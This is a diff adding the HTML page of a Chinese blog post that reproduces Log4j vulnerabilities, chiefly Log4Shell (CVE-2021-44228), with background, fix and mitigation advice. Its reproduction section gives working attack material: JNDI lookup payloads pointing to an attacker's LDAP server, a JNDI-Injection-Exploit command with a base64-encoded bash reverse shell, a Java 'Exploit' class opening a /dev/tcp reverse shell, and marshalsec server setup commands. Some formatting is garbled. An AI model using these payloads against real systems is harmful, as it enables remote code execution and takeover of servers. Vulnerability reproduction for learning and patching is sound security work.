@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html>
+  
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  <meta name="author" content="Dong Yuanxin">
+  
+  
+  <title>Log4j | hcncn6</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="漏洞复现,">
+  
+
+  
+  <meta name="description" content="hcncn小站">
+
+  
+
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.1/dist/av-min.js" async></script>
+  
+
+  
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+  
+
+  
+
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":false,"count":true},
+    welcome: {"enable":false,"interval":30},
+    start_time: "2018-11-1",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "Dong Yuanxin",
+    share: {"twitter":false,"facebook":false,"weibo":false,"qq":false,"wechat":false},
+    mathjax: true,
+    page_type: "",
+    root: "/"
+  };
+</script>
+
+  <script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+  
+</head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">博客0v0</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | 博客重建中，还有其他细节文章</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/categories/" target="_self">分类</a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/hcncn6" target="_blank" id="site-github">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+      <a href="javascript:void(0);" id="site-nav-btn">
+        <i class="fa fa-ellipsis-v"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<nav class="table-content" id="site-nav">
+  <div class="table-content-title">
+    <span>导航</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc">
+      
+        <li class="toc-item">
+          <a href="/" target="_self">
+            首页
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/archives/" target="_self">
+            归档
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/categories/" target="_self">
+            分类
+          </a>
+        </li>
+      
+    </ol>
+  </div>
+</nav>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2022-09-05
+    </span>
+    
+      <span>
+        | <a href="/categories/漏洞复现/"><i class="fa fa-bookmark"></i>漏洞复现</a>
+      </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    Log4j
+  </h1>
+  
+  <article class="passage-article">
+    <p><code>`</code><br>简介<br>    官网:<a href="https://logging.apache.org/log4j/2.x/Log4j" target="_blank" rel="noopener">https://logging.apache.org/log4j/2.x/Log4j</a> 是Apache 的一个开源项目，是一款基于Java 的开源日志记录工具。通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI 组件，甚至是套接口服务器、NT 的事件记录器、UNIX Syslog 守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。</p>
+<pre><code>Log4j 有什么漏洞
+    1.CVE-2017-5645漏洞攻击者发送一个特别制作的2 进制payload，在组件将字节反序列化为对象时，触发并执行构造的payload 代码。该漏洞是由于在处ObjectInputStream 时，接收函数对于不可靠来源的input 没有过滤。因此，通TcpSocketServer 和UdpSocketServer 添加可配置的过滤功能以及一些相关设置，可以有效的解决该漏洞。Apache Log4j 2.8.2 之前的2.x 版本中存在该反序列化漏洞
+    2.CVE-2019-17571漏洞Log4j 1.2 版本中包含一个SocketServer 类，在未经验证的情况下，该SocketServe 类很容易接受序列化的日志事件并对其进行反序列化，在结合反序列化工具使用时,可以利用该类远程执行任意代码。
+    3、CVE-2021-44228 漏洞
+</code></pre><p>2.15.0 之前的Log4j 版本存在通过ldap JNDI 解析器的远程代码执行漏洞。<a href="https://github.com/advisories/GHSA-jfh8-c2jp-5v3q—" target="_blank" rel="noopener">https://github.com/advisories/GHSA-jfh8-c2jp-5v3q—</a><br>        Apache Log4j 2.x &lt; 2.15.0-rc2<br>复现<br>    1<br>        ${jndi:ldap://xxx.dnslog.cn}<br>        0x04 JNDI注入反弹shell<br>这里用到一个JNDI注入的小工具，可以生成JNDI链接并启动后端相关服务<br><a href="https://github.com/welk1n/JNDI-Injection-Exploit" target="_blank" rel="noopener">https://github.com/welk1n/JNDI-Injection-Exploit</a><br>可执行程序为jar包，在命令行中运行以下命令：<br>$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]</p>
+<pre><code>        子主题
+            子主题
+                子主题
+                    子主题
+                        子主题
+                            子主题
+                                子主题
+                                    子主题
+    /root/jdk1.8.0_201/bin/java  -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c &apos;{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwLjEyOS85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}&apos;  -A  192.168.10.129
+
+    java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C touch /tmp/success -A 39.107.138.71
+    _=${jndi:ldap://192.168.10.129:1389/x7ijpe}&amp;indexInfo=false&amp;wt=json
+2
+import java.io.BufferedReader;
+</code></pre><p>import java.io.InputStream;<br>import java.io.InputStreamReader;<br>import java.lang.Runtime;<br>import java.lang.Process;</p>
+<p>public class Exploit{<br>    public Exploit() throws Exception {<br>        //创建一个进程的实例<br>        Process p = Runtime.getRuntime().exec(new String[]{“/bin/bash”,”-c”,”bash -i &gt;&amp; /dev/tcp/ip/1234 0&gt;&amp;1”});<br>        InputStream is = p.getInputStream();//输入流<br>        BufferedReader reader = new BufferedReader(new InputStreamReader(is));//输入流缓冲区</p>
+<pre><code>    String line;
+    while((line = reader.readLine()) != null) {//循环读取缓冲区中的数据
+        System.out.println(line);//输出获取 的数据
+    }
+
+    p.waitFor();//waitFor：返回该Process对象代表的进程的出口值，值0表示正常退出，非0非正常。
+    is.close(); 
+    reader.close();
+    p.destroy();//destroy：杀掉该Process对象代表的进程。
+}
+
+public static void main(String[] args) throws Exception {
+}
+</code></pre><p>}</p>
+<pre><code>javac exp.java
+python -m SimpleHTTPServer 80
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://192.168.10.129:8000/#Exploit&quot; 7777
+</code></pre><p>_=${jndi:ldap://192.168.10.129:7777/Exploit}&amp;indexInfo=false&amp;wt=json<br>修复<br>    Log4j 团队已注意到一个安全漏洞 CVE-2021-44228，该漏洞已在 Log4j 2.15.0 中得到解决。<br>最新版Log4j 2.17.1已发布，建议更新到2.17.1<br>    Log4j 的 JNDI 支持没有限制可以解析的名称。某些协议不安全或允许远程代码执行。Log4j 现在默认将协议限制为仅 java、ldap 和 ldaps，并将 ldap 协议限制为默认仅访问本地主机上提供的 Java 原始对象。</p>
+<p>允许暴露此漏洞的一个向量是 Log4j 允许查找出现在日志消息中。从 Log4j 2.15.0 开始，此功能现在默认禁用。虽然提供了以这种方式启用查找的选项，但强烈建议用户不要启用它。</p>
+<p>无法升级到 2.15.0 的用户可以通过以下方式减轻风险：</p>
+<pre><code>Log4j 2.10 或更高版本的用户可以添加 -Dlog4j.formatMsgNoLookups=true 作为命令行选项或将 log4j.formatMsgNoLookups=true 添加到类路径上的 log4j2.component.properties 文件中以防止查找日志事件消息。
+Log4j 2.7 以后的用户可以在 PatternLayout 配置中指定 %m{nolookups} 以防止在日志事件消息中查找。
+从 log4j-core jar 中删除 JndiLookup 和 JndiManager 类。删除 JndiManager 将导致 JndiContextSelector 和 JMSAppender 不再起作用。
+
+
+目前，Apache官方已发布新版本完成漏洞修复，建议及时升级至最新版本：
+</code></pre><p><a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2" target="_blank" rel="noopener">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a><br>建议同时采用如下临时措施进行漏洞防范：<br>1.添加jvm启动参数-Dlog4j2.formatMsgNoLookups=true<br>2.在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups=true；<br>3.JDK使用11.0.1、8u191、7u201、6u211及以上的高版本；<br>4.部署使用第三方防火墙产品进行安全防护。</p>
+<pre><code>原理
+    当用户输入信息时，应用程序中的log4j2组件会将信息记录到日志中
+</code></pre><p>假如日志中含有该语句${jndi:ldap:192.168.96.1:1099/shell}，</p>
+<pre><code>log4j就会去解析该信息，通过jndi的lookup()方法去解析该URL：ldap:192.168.96.1:1099/shell
+</code></pre><p>解析到ldap，就会去192.168.96.1:1099的ldap服务找名为shell的资源，</p>
+<pre><code>如果找不到就会去http服务中找
+
+在http中找到shell之后，就会将资源信息返回给应用程序的log4j组件，而log4j组件就会下载下来，然后发现shell是一个.class文件，就会去执行里面的代码，从而实现注入
+
+攻击者就可以通过shell实现任意的命令执行，造成严重危害
+</code></pre>
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    
+  </div>
+</aside>
+  
+    <aside class="passage-copyright">
+      <div>本文作者: hcncn</div>
+      
+        <div>
+          原文链接: 
+          <a href="" target="_blank">https://hcncn6.github.io/2022/09/05/复现/log4j2/</a>
+        </div>
+      
+      <div>
+        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
+      </div>
+    </aside>
+  
+  
+</div>
+
+    </main>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+      <div class="site-footer-info">
+        <i class="fa fa-paw"></i> 您是本站第 <span id="site-count"></span> 位访客
+      </div>
+    
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <div class="site-layer-input-choose">
+          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
+        </div>
+        <input type="text">
+        <i class="fa fa-search"></i>
+      </div>
+      
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
+  <div class="bottom-bar-left">
+    <a href="/2022/09/05/复现/Spring/" data-enable="true">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/2022/09/05/复现/1 - 副本 (4) - 副本 - 副本/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
+      <i class="fa fa-share-alt"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+  
+  
+  
+  
+</div>
+    
+
+
+
+
+
+    
+  </body>
+</html>
